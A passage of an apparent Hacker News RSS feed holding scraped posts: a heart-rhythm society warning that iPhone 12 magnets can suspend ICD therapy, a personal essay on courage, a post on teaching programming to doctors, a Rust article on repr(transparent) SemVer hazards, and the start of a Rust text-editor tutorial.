January 17, 2021 | https://bhrs.com/important-life-saving-therapy-inhibition-by-phones-containing-magnets/ | <a href="https://web.archive.org/web/*/https://bhrs.com/important-life-saving-therapy-inhibition-by-phones-containing-magnets/">archive.org</a>
<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page">
		<a href="#content">Skip to content</a>

	<div id="boxed-wrapper">
		
		<div id="wrapper">
			
			
				
			<header>
				<div>
					


<div>
	<div>
							<nav aria-label="Main Menu"><ul id="menu-main-menu"><li id="menu-item-854" data-item-id="854"><a href="#"><span>About</span></a><div><div><div data-width="660px"><ul><li id="menu-item-960"><div><div id="text-8">			<div><h3>About Us</h3>
<p>Find out about BHRS, our council members and view a copy of our constitution.</p>
</div>
		</div></div></li><li id="menu-item-2369"></li></ul></div></div></div></li><li id="menu-item-855" data-item-id="855"><a href="#"><span>Membership</span></a><div><div><div data-width="660px"><ul><li id="menu-item-975"><div><div id="text-9">			<div><h3>Membership</h3>
<p>Learn about the benefits of BHRS membership and how to join.</p>
</div>
		</div></div></li><li id="menu-item-2374"></li></ul></div></div></div></li><li id="menu-item-856" data-item-id="856"><a href="#"><span>Certification</span></a><div><div><div data-width="660px"><ul><li id="menu-item-1387"><div><div id="text-10">			<div><h3>Certification</h3>
<p>BHRS Certification is a recognition of knowledge and practical experience in the field of cardiac rhythm management.</p>
</div>
		</div></div></li><li id="menu-item-1386"></li></ul></div></div></div></li><li id="menu-item-858" data-item-id="858"><a href="#"><span>News</span></a><div><div><div data-width="660px"><ul><li id="menu-item-1397"><div><div id="text-11">			<div><h3>News</h3>
<p>View the latest in BHRS and arrhythmia care news and download the latest newsletters.</p>
</div>
		</div></div></li><li id="menu-item-1398"></li></ul></div></div></div></li><li id="menu-item-1401" data-item-id="1401"><a href="#"><span>Documents</span></a><div><div><div data-width="660px"><ul><li id="menu-item-1402"><div><div id="text-12">			<div><h3>Documents</h3>
<p>View the latest information and resources as well as BHRS guidelines, standards, position statements.</p>
</div>
		</div></div></li><li id="menu-item-1403"></li></ul></div></div></div></li><li id="menu-item-2402" data-item-id="2402"><a href="#"><span>Education</span></a><div><div><div data-width="660px"><ul><li id="menu-item-2409"><div><div id="text-13">			<div><h3>Education</h3>
<p>View educational information on training courses, opportunities and information within BHRS.</p>
</div>
		</div></div></li><li id="menu-item-2408"></li></ul></div></div></div></li><li id="menu-item-1686" data-item-id="1686"><a href="https://bhrs.com/contact/"><span>Contact</span></a></li></ul></nav>	

<nav aria-label="Main Menu Mobile"></nav>

					</div>
</div>
				</div>
				
			</header>
							
				
		
				
				
			
			
						<main id="main">
				<div>

<section id="content">
	
					<article id="post-5978">
										<span>IMPORTANT: Life Saving Therapy Inhibition by Phones Containing Magnets</span>
			
				
						<div>
				<div><div><div><div><div>
<p>The Heart Rhythm Society has issued the following information regarding the use of the new iPhone 12 Series and ICDs.</p>
<p>“Implantable Cardioverter Defibrillator (ICD) remains the cornerstone therapy in the management of malignant ventricular arrythmia’s for patients with high risk cardiac conditions. An ICD system contains a battery, capacitors, sensing/ pacing circuit together with an intra-or extra-cardiac lead. All ICD’s have an in-built switch (Reed switch, Hall-effect sensors, Giant magneto sensitive resistors or coils) which respond to an externally applied magnetic field. When an external magnet is applied to a defibrillator, high voltage shock therapy for ventricular tachycardia and ventricular fibrillation is suspended. It has been estimated that a magnetic field stronger than 10 Gauss is strong enough to activate these switches.</p>
<p>Recently, Apple Inc. launched the iPhone 12 series which has a circular array of magnets around a central charging coil for the phone to be compatible with “MagSafe” accessories. MagSafe technology contains a magnetometer and single coil Near Field Communications (NFC) reader. The magnets aids in properly aligning the iPhone on a wireless charger and other peripheral accessories and increases wireless charging speeds (up to 15 Watts). The first author (JG) raised the concerns for possible device-device interaction due to presence of a strong magnetic array in the iPhone and MagSafe compatible cases. We thus tested this interaction on a patient with a Medtronic Inc. (Minneapolis, MN, USA) ICD. Institutional Review Board approved the study. Once the iPhone was brought close to the ICD over the left chest area, immediate suspension of ICD therapies was noted which persisted for the duration of the test. This was reproduced multiple times with different positions of the phone over the pocket.</p>
<p>We hereby bring an important public health issue concerning the newer generation iPhone 12 which can potentially inhibit lifesaving therapy in a patient particularly while carrying the phone in upper pockets. Contemporary studies have shown minimal risk of electromagnetic interference with ICDs and prior smartphones without magnetic arrays. A recent case report highlighted magnetic interference with a fitness tracker wrist band deactivating an ICD up to distances of 2.4 cm. Apple Inc. website does mention magnetic interference with medical devices and prior consulting with physician and medical device manufacturers. Medical device manufacturers and implanting physicians should remain vigilant in making patients aware of this significant interaction of the iPhone 12 and other smart wearables with their cardiac implantable electronic devices”.</p>
</div><div><h3><strong>If you have an interesting case, ECG or EGM please consider submitting a report. It’s a great opportunity to show CPD and share experiences for others to learn from.</strong></h3>
<p>Submissions should include a brief case background, a question with multiple choice possible answers, the answer, an explanation, a brief discussion section if relevant and a minimum of one reference and be sent to <a href="mailto:admin@bhrs.com" target="_blank" rel="noopener noreferrer">admin@bhrs.com</a> with the subject heading ‘BHRS Challenge Feature’</p>
<p>As part of our ongoing collaboration with Radcliffe Cardiology we are planning to co-publish successful submissions on the BHRS website and on a new case-based web platform, led by Professor Angelo Auricchio and the Radcliffe Group called the <a href="https://arrhythmiaacademy.com/" target="_blank" rel="noopener noreferrer">Arrhythmia Academy</a></p>
<p>As an incentive to submit cases the editor in chief of Arrhythmia and Electrophysiology Review (AER) journal, Dr Demosthenes Katritsis would like to select a ‘winning case’ each quarter and invite the author of these best cases to write a review or an expert opinion piece on the topic addressed, that would be published in the AER journal and indexed on PubMed.</p>
</div></div></div><div><div><span><a href="https://www.heartrhythmjournal.com/article/S1547-5271(20)31227-3/fulltext" target="_blank" aria-label="iphone" rel="noopener noreferrer"><img width="562" height="299" src="https://bhrs.com/wp-content/uploads/2021/01/iphone.jpg" srcset="https://bhrs.com/wp-content/uploads/2021/01/iphone-200x106.jpg 200w, https://bhrs.com/wp-content/uploads/2021/01/iphone-400x213.jpg 400w, https://bhrs.com/wp-content/uploads/2021/01/iphone.jpg 562w" sizes="(max-width: 800px) 100vw, 400px"></a></span></div></div></div></div>
							</div>

												<span><span><a href="https://bhrs.com/author/pauline-2-2-2/" title="Posts by Pauline" rel="author">Pauline</a></span></span><span>2021-01-07T18:13:30+00:00</span>																								
																	</article>
	</section>
					
				</div>  <!-- fusion-row -->
			</main>  <!-- #main -->
			
			
			
										
				 <!-- fusion-footer -->

									</div> <!-- wrapper -->

								<a></a>

				<!-- Memberships powered by Paid Memberships Pro v2.5.2.
 -->
			
			
	




































































































				
					



</div></div>]]>
            </description>
            <link>https://bhrs.com/important-life-saving-therapy-inhibition-by-phones-containing-magnets/</link>
            <guid isPermaLink="false">hacker-news-small-sites-25809732</guid>
            <pubDate>Sun, 17 Jan 2021 10:49:58 GMT</pubDate>
        </item>
        <item>
            <title>
<![CDATA[Mapping 18'000 Asteroids]]>
            </title>
            <description>
<![CDATA[
Score 9 | Comments 0 (<a href="https://news.ycombinator.com/item?id=25809671">thread link</a>) | @cellover
<br/>
January 17, 2021 | https://eleanorlutz.com/mapping-18000-asteroids | <a href="https://web.archive.org/web/*/https://eleanorlutz.com/mapping-18000-asteroids">archive.org</a>
<br/><!-- hnss:readable-content --><hr/>Unable to extract article]]>
            </description>
            <link>https://eleanorlutz.com/mapping-18000-asteroids</link>
            <guid isPermaLink="false">hacker-news-small-sites-25809671</guid>
            <pubDate>Sun, 17 Jan 2021 10:37:50 GMT</pubDate>
        </item>
        <item>
            <title>
<![CDATA[People that think you’re an asshole]]>
            </title>
            <description>
<![CDATA[
Score 44 | Comments 54 (<a href="https://news.ycombinator.com/item?id=25809346">thread link</a>) | @LeonW
<br/>
January 17, 2021 | https://leowid.com/the-people-that-think-youre-an-asshole/ | <a href="https://web.archive.org/web/*/https://leowid.com/the-people-that-think-youre-an-asshole/">archive.org</a>
<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page"><div>
            <header>    
                
            </header>

            <section>
            <div>
                <div><p>“The people that think you’re an asshole, they already think that about you now, Leo! You might as well do what you want anyway.” This Is what my friend Ed told me when I shared with him my fears about telling some grueling stories in my upcoming book. And what people might think about me when they read it and what I’ve done so far in my life. Strangely that was a huge relief.</p>
<p>On the other hand, if they don’t think so negatively about me as I’d projected when they find out about another “outing”, it’ll probably bring us closer together. In a way, it’s a win-win.</p>
<p><a href="https://leowid.com/the-6-practices-that-influenced-my-life-the-most-over-the-past-5-years/">Radical honesty</a> is a bitch, I’m learning. It hurts so bad at times but also frees me so much.</p>
<p>I’ve since mentioned this phrase of his several times with friends and in coaching sessions in various ways: those people that you think don’t like you, they already don’t like you now. Whether you do the thing or not.</p>
<p>What this leads to is courage. Courage is the thing we find when we give up on needing to be liked. Even for a brief moment. Then we are free to do what we want to do because we want to do it. This is real freedom.</p>
<p>It’s crushing and disappointing that we can’t stay there in that state of freedom. That we retreat again after a while into the darkness and the need to be liked and wanted. That’s ok, that’s life. From there, we garner and ripen the courage yet again to go out there and not care for what others think of us.</p>
<p>Along the way, we might make some friends that encourage us in this process and that back and forth. But it’s really not necessary to be too harsh on ourselves when we realize none of these states are permanent.</p>
<p>“Cheer up! You can’t blame anyone else for the kind of world that you’re in. And if you know that “I”, in the sense of the person, the front, the ego, it really doesn’t exist. Then it won’t go to your head to badly if you wake up and discover that you’re god.” is what Alan watts said, which I feel belongs here.</p>
<p>So go out there. And don’t worry about the people you fear think of you as an asshole, they already do that now anyway. You might as well take my friend Ed’s advice and do your thing regardless. Good luck and I’m here if I can help.</p>
</div>
            </div>
        </section><section>
                <div>
                    <p><img data-src="https://leowid.com/wp-content/uploads/2020/07/Leo-Profile.jpg" data-srcset="https://leowid.com/wp-content/uploads/2020/07/Leo-Profile.jpg 400w, https://leowid.com/wp-content/uploads/2020/07/Leo-Profile-300x300.jpg 300w, https://leowid.com/wp-content/uploads/2020/07/Leo-Profile-150x150.jpg 150w, https://leowid.com/wp-content/uploads/2020/07/Leo-Profile-180x180.jpg 180w" data-sizes="(max-width: 100px) 100vw, 100px" alt="" src="https://leowid.com/wp-content/uploads/2020/07/Leo-Profile.jpg" srcset="https://leowid.com/wp-content/uploads/2020/07/Leo-Profile.jpg 400w, https://leowid.com/wp-content/uploads/2020/07/Leo-Profile-300x300.jpg 300w, https://leowid.com/wp-content/uploads/2020/07/Leo-Profile-150x150.jpg 150w, https://leowid.com/wp-content/uploads/2020/07/Leo-Profile-180x180.jpg 180w">
                        <span>Leo Widrich</span>
                        <span>Leo Widrich coaches extraordinary people. In his previous life, he co-founded Buffer, a $20m+ revenue software company. He also lived in Buddhist monasteries for close to two years, trained as a trauma therapist and now lives in Vienna near the forest. He tweets <a href="https://twitter.com/LeoWid">@leowid</a>. To learn about working with him, <a href="https://leowid.com/working-with-me/">go here</a>.</span>
                    </p>
                </div>
            </section><section>
        <div>
            <div><h3>Receive my most vulnerable and powerful lessons from meeting life.</h3><p>Add your details below for my weekly newsletter.</p></div>
        </div>
    </section>
        </div></div>]]>
            </description>
            <link>https://leowid.com/the-people-that-think-youre-an-asshole/</link>
            <guid isPermaLink="false">hacker-news-small-sites-25809346</guid>
            <pubDate>Sun, 17 Jan 2021 09:13:49 GMT</pubDate>
        </item>
        <item>
            <title>
<![CDATA[Why teaching programming is so difficult?]]>
            </title>
            <description>
<![CDATA[
Score 4 | Comments 6 (<a href="https://news.ycombinator.com/item?id=25809333">thread link</a>) | @rukshn
<br/>
January 17, 2021 | https://ruky.me/2021/01/16/why-teaching-programming-is-so-difficult/ | <a href="https://web.archive.org/web/*/https://ruky.me/2021/01/16/why-teaching-programming-is-so-difficult/">archive.org</a>
<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page"><div>

<p>Like I said in one of my previous posts, I just started my first semester in my <a href="https://ruky.me/2020/12/23/what-is-health-informatics-and-what-i-do-for-a-living/" data-type="post" data-id="85">MSc in health informatics</a>. And the first semester has a module for object oriented programming.</p>
<h2>Some history</h2>
<p>I was lucky to learn computers since I was 10 years old, even though computers were mostly used in offices and even though my parents didn’t have much knowledge in computers, they sent me to a class where they taught the basics in computing.</p>
<p>After some basics in computers, we were fist taught MS Basic, as a 11 year old, basic was an easy to understand language, me and my friends experimented in creating new programmes and it was all fun.</p>
<p>Then as the years went on we learned Pascal, C++, Visual Basic and JAVA. By 14-15 I created some interesting programs with Visual Basic and .NET. Every Saturday me and my friends at the computer class showed off to each other what they have created during the week. It was a fun time.</p>
<p>As a 15 year old one thing I failed to grasp was object oriented programming, yes I knew how to use Visual Basic, but it took me some more time to really understand the scope of Object Oriented Programming.</p>
<h2>Me trying to teach programming to doctors</h2>
<p>I went to become a doctor, but even at medical college I never lost my touch in programming, and curiosity to learn new things. I learned JavaScript, frameworks like Angular, Vue, React, and now I’m more interested in web technologies.</p>
<p>Fast forward 15 years later, I’m learning basics in Object Oriented Programming again, as a post graduate student in health informatics.</p>
<p>Even though I’m also a newbie in networking and software engineering (I never liked hardware and networking side of things as a child), because I have learned the basics of programming, I feel object oriented programming and JAVA lessons as something that comes natural to me.</p>
<p>However, the same cannot be said to some of my colleagues, whom they have not learned programming or basics in computing when they were young. This is their first time in learning object oriented programming, JAVA. Almost everyone is more than 30 years old, and some of them turn to me to explain them how to get though their JAVA assignments.</p>
<p>I constantly repeat them the fact that,</p>
<blockquote><p><strong>Don’t learn java, don’t try to memorise the java syntax, learn the principals of object oriented programming, and programming. Once you learn the concepts, you will be able to apply that to any OOP language and crate whatever you want.</strong></p></blockquote>
<p>However, they constantly find it difficult to grasp the concepts object oriented programming, and in return they also find it difficult to learn java or any other language.</p>
<p>And when I try to explain, or “<em>try to</em> <em>teach</em> them” Java they always find it difficult to understand</p>
<ul><li>What is a function/method?</li><li>What is meant by return?</li><li>What is an array? What is an index? </li><li>Why looping is so hard to understand?</li><li>What is the meaning of <em>public stat</em>ic void main()</li></ul>
<p>There are some of the usual questions I get to answer but still no matter how hard I explained to them, they always find it difficult to understand it.</p>
<h2>Why teaching programming is so difficult?</h2>
<ul><li>Maybe I’m not a good teacher</li><li>Maybe I’m trying to explain to them in a position where I’m subconsciously explaining to them thinking they also had some basic knowledge in computing when they were children.</li><li>It is a known fact that with age you lose the ability to learn new skills, is due to their age which makes it difficult for them to understand programming?</li><li>Is it because they straightaway had to go to Java instead of learning a simpler language first, like what I did as a child?</li><li>Since they are doctors I don’t think they lack the analitical capabilities in understanding the logics behind programming. </li></ul>
<p>So what makes it so difficult for them to understand programming?</p>
<h2>What should I do to make them like programming, and learn the basics in object oriented programming?</h2>
<p>I tried everything possible, </p>
<ul><li>I explained to them as simple as I can</li><li>I showed them some articles available online</li><li>I wrote some easy to understand posts by my self and emailed to them</li><li>I showed them some YouTube videos that explains object oriented programming and java </li></ul>
<p>But none of them seems to work and I don’t see a good progress in any of them.</p>
<p>What do you recommend that I should to to make them learn programming basics and JAVA? The last option is to create some basic lessons coupled with some simple exercises for them to do, instead of somewhat complex assignments given to them by the MSc program.</p>
</div></div>]]>
            </description>
            <link>https://ruky.me/2021/01/16/why-teaching-programming-is-so-difficult/</link>
            <guid isPermaLink="false">hacker-news-small-sites-25809333</guid>
            <pubDate>Sun, 17 Jan 2021 09:10:24 GMT</pubDate>
        </item>
        <item>
            <title>
<![CDATA[Rust's SemVer Snares: `Repr(transparent)` Super-Cut]]>
            </title>
            <description>
<![CDATA[
Score 3 | Comments 0 (<a href="https://news.ycombinator.com/item?id=25809318">thread link</a>) | @lukastyrychtr
<br/>
January 17, 2021 | https://jack.wrenn.fyi/blog/semver-snares-transparent/ | <a href="https://web.archive.org/web/*/https://jack.wrenn.fyi/blog/semver-snares-transparent/">archive.org</a>
<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page"><div itemprop="articleBody">
    <p><a href="https://jack.wrenn.fyi/blog/semver-snares"><em>(Part of an ongoing series!)</em></a></p>
<p>In the last two posts, <code>repr(transparent)</code> provided an unusual mechanism by which safe, downstream code could inadvertently rely on the <a href="https://jack.wrenn.fyi/blog/semver-snares-size/">size</a> and <a href="https://jack.wrenn.fyi/blog/semver-snares-alignment/">alignment</a> of an upstream type. In this post, I'll recap the issue and discuss why it is tricky to fix.</p>
<p>To recap, <code>repr(transparent)</code> attribute provides a mechanism for observing the alignment of a type. The <code>repr(transparent)</code> attribute can be applied to types where:</p>
<ul>
<li>at most one field has size greater-than zero, and</li>
<li>all <em>other</em> fields have minimum alignment equal to 1</li>
</ul>
<p>...to specify that the annotated type's layout is identical to that of the non-zero-sized field.</p>
<p>Applying <code>repr(transparent)</code> to a type with more than one field of size ≥1 is a compile error:</p>
<pre><code data-lang="rust"><span>#[</span><span>repr</span><span>(transparent)]
</span><span>pub struct </span><span>Foo {
    </span><span>bar</span><span>: </span><span>u8</span><span>, </span><span>// size = 1
    </span><span>baz</span><span>: </span><span>u8  </span><span>// size = 1 (⚠)
</span><span>}
</span></code></pre>
<p>...as is applying <code>repr(transparent)</code> to a type with more than one field having alignment &gt;1:</p>
<pre><code data-lang="rust"><span>#[</span><span>repr</span><span>(transparent)]
</span><span>pub struct </span><span>Foo {
    </span><span>bar</span><span>: </span><span>u8</span><span>,      </span><span>// align = 1
    </span><span>baz</span><span>: [</span><span>u16</span><span>; 0] </span><span>// align = 2 (⚠)
</span><span>}
</span></code></pre>
<p><strong>At present, you should not use <code>#[repr(transparent)]</code> unless you are sure your ZST fields are <em>guaranteed</em> to have size equal to zero, and alignment equal to one.</strong></p>
<p>What would it take to fully shift this diligence from the programmer to the compiler?</p>
<h2 id="potentially-breaking-changes">Potentially-Breaking Changes</h2>
<p>To answer this, let's consider the sorts of (otherwise) non-breaking changes that can increase the alignment and size of ZSTs.</p>
<h3 id="repr-annotations"><code>repr</code> Annotations</h3>
<p>Applying a <code>repr</code> annotation to a type can alter its size and alignment. The <code>align(N)</code> modifier specifies that the annotated type will have a minimum alignment of at least <code>N</code>:</p>
<pre><code data-lang="rust"><span>// uncommenting this line breaks `Bar`:
/* #[repr(align(2))] */
</span><span>struct </span><span>Foo;

#[</span><span>repr</span><span>(transparent)]
</span><span>struct </span><span>Bar(</span><span>u8</span><span>, Foo);
</span></code></pre>
<p>Adding <code>repr(C)</code> or <code>repr(&lt;primitive&gt;)</code> to an ZST <code>enum</code> can increase its size:</p>
<pre><code data-lang="rust"><span>// uncommenting this line breaks `Bar`:
/* #[repr(isize)] */
</span><span>enum </span><span>Foo {
  Variant
}

#[</span><span>repr</span><span>(transparent)]
</span><span>struct </span><span>Bar(</span><span>u8</span><span>, Foo);
</span></code></pre><h3 id="fields">Fields</h3>
<p>Generally speaking, it is not a breaking change to:</p>
<ul>
<li>modify or remove private fields</li>
<li>add private fields to structs marked with <code>#[non_exhaustive]</code></li>
<li>add private fields to structs that already have private fields</li>
</ul>
<p>...but, in the presence of <code>repr(transparent)</code>, all of the above changes can potentially break downstream code.</p>
<p>The minimum alignment of <code>repr(C)</code> and <code>repr(transparent)</code> types is equal to the greatest minimum alignment of its fields. Adding a &gt;1-aligned field to a 1-aligned ZST prohibits that ZST from use as a field in a <code>repr(transparent)</code> type:</p>
<pre><code data-lang="rust"><span>#[</span><span>repr</span><span>(C)]
</span><span>pub struct </span><span>Foo {
    </span><span>bar</span><span>: [</span><span>u8</span><span>; 0], </span><span>// align == 1
    // uncommenting this field breaks `Bar`:
    /* baz: [u16; 0], */ // align == 2
</span><span>}

#[</span><span>repr</span><span>(transparent)]
</span><span>struct </span><span>Bar(</span><span>u8</span><span>, Foo);
</span></code></pre>
<p>Likewise, adding or modifying a field of a ZST such that the size increases in a breaking change:</p>
<pre><code data-lang="rust"><span>#[</span><span>repr</span><span>(C)]
</span><span>pub struct </span><span>Foo {
    </span><span>bar</span><span>: (),
    </span><span>// uncommenting this field breaks `Bar`:
    /* baz: u8 */
</span><span>}

#[</span><span>repr</span><span>(transparent)]
</span><span>struct </span><span>Bar(</span><span>u8</span><span>, Foo);
</span></code></pre><h3 id="type-parameters">Type Parameters</h3>
<p>As type parameters provide a mechanism for consumers to alter the private, internal details of a type, <em>changes</em> to how type parameters are instantiated directly effect the alignment of a type:</p>
<pre><code data-lang="rust"><span>/// `Foo` is *always* a ZST, but its alignment is equal to that of `T` 
</span><span>#[</span><span>repr</span><span>(C)] </span><span>struct </span><span>Foo&lt;T&gt;([T; 0]);

assert_eq!(</span><span>0</span><span>, size_of::&lt;Foo&lt;</span><span>u8</span><span>&gt;&gt;());
assert_eq!(</span><span>0</span><span>, size_of::&lt;Foo&lt;</span><span>u16</span><span>&gt;&gt;());

assert_eq!(</span><span>1</span><span>, align_of::&lt;Foo&lt;</span><span>u8</span><span>&gt;&gt;());
assert_eq!(</span><span>2</span><span>, align_of::&lt;Foo&lt;</span><span>u16</span><span>&gt;&gt;());
</span></code></pre>
<p>...and the size of a type:</p>
<pre><code data-lang="rust"><span>/// `Foo` is 1-aligned, but has the size of `T`
</span><span>#[</span><span>repr</span><span>(C, packed)] </span><span>struct </span><span>Foo&lt;T&gt;(MaybeUninit&lt;T&gt;);

assert_eq!(</span><span>1</span><span>, size_of::&lt;Foo&lt;</span><span>u8</span><span>&gt;&gt;());
assert_eq!(</span><span>2</span><span>, size_of::&lt;Foo&lt;</span><span>u16</span><span>&gt;&gt;());

assert_eq!(</span><span>1</span><span>, align_of::&lt;Foo&lt;</span><span>u8</span><span>&gt;&gt;());
assert_eq!(</span><span>1</span><span>, align_of::&lt;Foo&lt;</span><span>u16</span><span>&gt;&gt;());
</span></code></pre>
<p>Consequently, Rust must usually assume that generically-instantiated fields are <em>not</em> one-aligned ZSTs:</p>
<pre><code data-lang="rust"><span>#[</span><span>repr</span><span>(transparent)]
</span><span>struct </span><span>Foo&lt;T, U&gt;(T, [U; 0]);
</span></code></pre><pre><code><span>error<a href="https://doc.rust-lang.org/nightly/error-index.html#E0690" target="_blank">[E0690]</a>: transparent struct needs exactly one non-zero-sized field, but has 2</span>
 <a href="#" data-line="2" data-col="1">--&gt; src/lib.rs:2:1
</a>  |
2 | struct Foo&lt;T, U&gt;(T, [U; 0]);
  | ^^^^^^^^^^^^^^^^^-^^------^^
  | |                |  |
  | |                |  this field is non-zero-sized
  | |                this field is non-zero-sized
  | needs exactly one non-zero-sized field, but has 2
</code></pre>
<p>This error is necessary if one wants to provide <em>definition-site</em> errors for <code>repr(transparent)</code> violations.</p>
<h3 id="const-parameters">Const Parameters</h3>
<p>Unsurprisingly, the instantiation of a const-generic parameter can affect the size of a type:</p>
<pre><code data-lang="rust"><span>/// the alignment of `Foo&lt;N&gt;` is 1
/// the size of `Foo&lt;N&gt;` is `N` bytes
</span><span>#[</span><span>repr</span><span>(C)]
</span><span>struct </span><span>Foo&lt;</span><span>const</span><span> N: </span><span>usize</span><span>&gt;([</span><span>u8</span><span>; N]);
</span></code></pre>
<p>The instantiation of const-generic parameters can also affect the alignment of a type:</p>
<pre><code data-lang="rust"><span>use </span><span>std::mem::align_of;

</span><span>/// alignment of `ZST&lt;{N}&gt;` is equal to `N`
/// the size of `ZST&lt;{N}&gt;` is equal to 0.
</span><span>#[</span><span>repr</span><span>(C)]
</span><span>pub struct </span><span>ZST&lt;</span><span>const</span><span> N: </span><span>usize</span><span>&gt;
where
    (): Align&lt;{N}</span><span>&gt;</span><span>,
{
    align: [</span><span>&lt;</span><span>() </span><span>as </span><span>Align&lt;{N}</span><span>&gt;&gt;</span><span>::Type; </span><span>0</span><span>],
}

assert_eq!(</span><span>1</span><span>, align_of::&lt;ZST&lt;1&gt;&gt;());
assert_eq!(</span><span>2</span><span>, align_of::&lt;ZST&lt;2&gt;&gt;());

</span><span>pub trait </span><span>Align&lt;const N: usize&gt; { </span><span>type </span><span>Type; }
#[</span><span>repr</span><span>(</span><span>align</span><span>(1)</span><span>)] </span><span>pub struct </span><span>Align1;
#[</span><span>repr</span><span>(</span><span>align</span><span>(2)</span><span>)] </span><span>pub struct </span><span>Align2;
</span><span>/* and so on */
</span><span>impl </span><span>Align&lt;{1}&gt; </span><span>for</span><span> () { </span><span>type </span><span>Type </span><span>=</span><span> Align1; }
</span><span>impl </span><span>Align&lt;{2}&gt; </span><span>for</span><span> () { </span><span>type </span><span>Type </span><span>=</span><span> Align2; }
</span><span>/* and so on */
</span></code></pre><h3 id="default-repr-and-rustc-version">Default <code>repr</code> and <code>rustc</code> Version</h3>
<p>Generally speaking, the layout properties of "default repr" (i.e., a type without a <code>repr</code> attribute) are <em>unspecified</em>. To my knowledge, it is not currently specified that:</p>
<pre><code data-lang="rust"><span>enum </span><span>Foo {
  Bar
}
</span></code></pre>
<p>is guaranteed to be a one-aligned and zero-sized. Although <code>Foo</code> may be laid out as such by <em>particular</em> versions of Rust (such as the version available at the time of writing), that may not be true for <em>future</em> versions of Rust. This is a deeper issue than just SemVer stability.</p>
<h2 id="enforcing-semver-stability">Enforcing SemVer Stability</h2>
<p>At the time of writing, there is <a href="https://github.com/rust-lang/rust/issues/78586">some effort to eliminate</a> the stability hazards of <code>repr(transparent)</code>. However, to <em>comprehensively</em> enforce that uses of <code>#[repr(transparent)]</code> are SemVer-respecting at type definition sites in this manner, <code>rustc</code> would need implement all of the following restrictions atop the basic well-formedness check:</p>
<ol>
<li>prohibit, on all but one field, most occurences of type parameters</li>
<li>prohibit, on all but one field, most occurences of const parameters</li>
<li>require, on all but one field, that field types are fully-implicitly constructible</li>
<li>require, on all but one field, that field types have well-specified sizes and alignments</li>
<li>document that changing the <code>repr</code> of <em>any</em> one-aligned ZST is a SemVer Breaking Change™</li>
</ol>
<p>These requirements have far-reaching implications for the role of layout and <code>repr</code> in SemVer stability. Since these adjustments would likely need to be timed with an edition change anyways, it's worth considering if a simpler formulation of <code>repr(transparent)</code> exists. I think there is: limit <code>repr(transparent)</code> to structs on which at most one field is <em>not</em> <code>PhantomData</code>.</p>
<h2 id="beyond-repr-transparent">Beyond <code>repr(transparent)</code></h2>
<p>SemVer aside, <code>repr(transparent)</code>'s restrictions on generic parameters are complex and unwieldy. These restrictions are necessary to ensure, <strong>at definition site</strong>, that <em>any</em> instantiation of the annotated type will be transparent with respect to its non-one-aligned-ZST field. But, in the future, <code>repr(transparent)</code> may not be necessary at all as a layout modifier (merely as a definition-site check).</p>
<p>The Unsafe Code Working Group <a href="https://github.com/rust-lang/unsafe-code-guidelines/pull/164">proposes</a> that one-aligned-ZST fields shalt not influence the layout of default-<code>repr</code> structs, and that default-<code>repr</code> structs with exactly one <em>non</em>-one-aligned-ZST field shall have layout identical to that of the field. If accepted, these rules would mean that one could determine whether or not a particular type was <em>effectively</em> transparent, even in the absence of <code>repr(transparent)</code>. What would be missing is an in-language mechanism to double-check. To this end, I'd suggest the introduction of the compiler-intrinsic trait <code>mem::AbiEq&lt;Other&gt;</code>, which is implemented for all types whose ABI is identical to <code>Other</code>.</p>

  </div></div>]]>
            </description>
            <link>https://jack.wrenn.fyi/blog/semver-snares-transparent/</link>
            <guid isPermaLink="false">hacker-news-small-sites-25809318</guid>
            <pubDate>Sun, 17 Jan 2021 09:07:05 GMT</pubDate>
        </item>
        <item>
            <title>
<![CDATA[Hecto: Build your own text editor in Rust]]>
            </title>
            <description>
<![CDATA[
Score 4 | Comments 1 (<a href="https://news.ycombinator.com/item?id=25809288">thread link</a>) | @lukastyrychtr
<br/>
January 17, 2021 | https://www.philippflenker.com/hecto/ | <a href="https://web.archive.org/web/*/https://www.philippflenker.com/hecto/">archive.org</a>
<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page"><div>

    <p><a href="https://www.philippflenker.com/hecto-chapter-1/">First chapter</a> - <a href="https://www.philippflenker.com/hecto-appendices/">Appendices</a> - <a href="https://www.philippflenker.com/hecto-chapter-7/">Last chapter</a></p>

<p>This is a series of blog posts that shows you how to
build a text editor in Rust. It’s a re-implementation of
<a href="http://antirez.com/news/108">kilo</a> in Rust, as outlined in <a href="https://viewsourcecode.org/snaptoken/kilo/index.html">this fantastic
tutorial</a>. Same as the
original booklet, these blog posts guide you through all the steps to build a
basic text editor, <code>hecto</code>.</p>

<p>You will almost always be able to see your changes in action by applying the
changes, saving and running the program. I will explain every step along the way
as best as I can - sometimes in great detail, and often linking to other pages.
Feel free to skim over the prose and ignore the links, there is plenty to learn
just by applying the code changes and watching your text editor grow!</p>

<h2 id="why">Why?</h2>
<p>I have always thought that every software engineer needs to have more than
superficial knowledge of at least two programming languages. However, I have to
admit, that in the past few years, my knowledge in pretty much everything except
JavaScript has started to fade.</p>

<p>That’s why I started to learn Rust, and I have re-implemented <code>kilo</code> as a
learning experience. But <em>why</em>? In order to learn Rust, I wanted ro re-implement
a well-understood piece of software, so that I could focus on the language
without getting lost in the implementation details. But I did not want to
re-implement stuff I used JavaScript for, as I think that JavaScript is designed
for a different problem space than Rust. Or in other words: If you are a
plumber, you best learn how to use an axe by using it to chop down some trees,
and not to unclog a sink.</p>

<p><code>kilo</code> is complex enough to pose a challenge, and when I read it, I wished it
was available for Rust - and now it is!</p>

<p>And <em>why</em> the name? <code>hecto</code> follows more modest goals than <code>kilo</code>. It does not
aim to be small, and it wasn’t even my own idea - so it seemed appropriate to
give it a more modest name than its spiritual predecessor.</p>

<h2 id="license">License</h2>
<ul>
  <li><code>kilo</code> was distributed under the <a href="https://opensource.org/licenses/BSD-2-Clause">BSD-2 Clause
License</a></li>
  <li>The <a href="https://viewsourcecode.org/snaptoken/kilo/">original tutorial</a> was
distributed under <a href="https://creativecommons.org/licenses/by/4.0/">CC BY 4.0</a></li>
  <li><code>hecto</code> and this tutorial are licensed under <a href="https://creativecommons.org/licenses/by/4.0/">CC BY
4.0</a></li>
</ul>

<h3 id="indication-of-changes">Indication of Changes</h3>
<p>While these blog posts are based firmly on the <a href="https://viewsourcecode.org/snaptoken/kilo/index.html">original
tutorial</a>, the code has
